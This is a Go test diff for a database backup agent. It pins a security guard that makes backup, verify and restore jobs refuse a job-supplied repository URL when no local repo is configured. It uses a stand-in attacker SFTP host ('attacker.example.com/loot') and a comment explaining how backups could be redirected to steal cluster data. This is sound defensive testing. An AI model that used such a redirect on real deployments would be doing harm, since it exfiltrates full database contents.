@@ -63,3 +63,65 @@ func TestExecutor_RejectsNonBackupKind(t *testing.T) {
 		}
 	}
 }
+
+// TestExecutor_RefusesJobRepoWithoutLocalRepo pins the SEC-2 guard:
+// when the deployment has no repo in the agent's local config, a
+// job-supplied RepoURL must be refused. Without it, anyone with
+// control-plane access could redirect a deployment's physical base
+// backup (fresh, full cluster data) to an attacker-chosen repo URL,
+// because the cross-repo match guard skips when dep.Repo is empty.
+func TestExecutor_RefusesJobRepoWithoutLocalRepo(t *testing.T) {
+	deps := map[string]config.DeploymentConfig{
+		"db1": {
+			PGConnection: "postgres://x@y/z",
+			// Repo intentionally empty: wal-stream/doctor-only
+			// deployment.
+		},
+	}
+	const attackerRepo = "sftp://attacker.example.com:2222/loot"
+
+	t.Run("backup", func(t *testing.T) {
+		ex := agent.NewBackupExecutor(deps, config.KMSConfig{}, nil, nil)
+		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
+			ID: "job-1", Kind: "backup", Deployment: "db1", RepoURL: attackerRepo,
+		}, func(map[string]any) {})
+		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
+			t.Errorf("expected job-supplied-repo refusal; got %v", err)
+		}
+	})
+
+	t.Run("verify", func(t *testing.T) {
+		ex := agent.NewVerifyExecutor(deps, config.KMSConfig{}, nil, "")
+		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
+			ID: "job-1", Kind: "verify", Deployment: "db1", RepoURL: attackerRepo,
+			Args: map[string]any{"backup_id": "db1.full.20260820T000000Z.abcdef01"},
+		}, func(map[string]any) {})
+		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
+			t.Errorf("expected job-supplied-repo refusal; got %v", err)
+		}
+	})
+
+	t.Run("restore", func(t *testing.T) {
+		ex := agent.NewRestoreExecutor(deps, config.KMSConfig{}, nil, "")
+		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
+			ID: "job-1", Kind: "restore", Deployment: "db1", RepoURL: attackerRepo,
+			Args: map[string]any{
+				"backup_id":  "db1.full.20260820T000000Z.abcdef01",
+				"target_dir": "/tmp/restore-sec2",
+			},
+		}, func(map[string]any) {})
+		if err == nil || !strings.Contains(err.Error(), "refusing job-supplied repo") {
+			t.Errorf("expected job-supplied-repo refusal; got %v", err)
+		}
+	})
+
+	t.Run("no job repo still refused (unchanged)", func(t *testing.T) {
+		ex := agent.NewBackupExecutor(deps, config.KMSConfig{}, nil, nil)
+		_, err := ex.Execute(context.Background(), &agent.ControlPlaneJob{
+			ID: "job-1", Kind: "backup", Deployment: "db1",
+		}, func(map[string]any) {})
+		if err == nil || !strings.Contains(err.Error(), "has no repo configured locally") {
+			t.Errorf("expected no-repo refusal; got %v", err)
+		}
+	})
+}
